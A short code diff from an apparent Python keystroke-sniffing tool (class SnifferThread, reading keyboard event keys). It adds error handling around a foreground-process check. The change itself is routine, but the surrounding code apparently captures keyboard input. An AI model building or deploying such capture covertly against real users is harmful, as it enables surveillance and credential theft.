@@ -52,11 +52,15 @@ class SnifferThread(threading.Thread):
     def CheckProcess(self, event):
         fgWindow = win32gui.GetForegroundWindow()
         threadID, ProcessID = win32process.GetWindowThreadProcessId(fgWindow)
-        procname = psutil.Process(ProcessID)
+        try:
+            procname = psutil.Process(ProcessID)
+        except:
+            return False
         if procname.name() == "pythonw.exe":
             return True
         else:
             return False
+
     def IdentifyNonPrintChar(self, event):
         keyname = event.Key
         keyAscii = event.Ascii
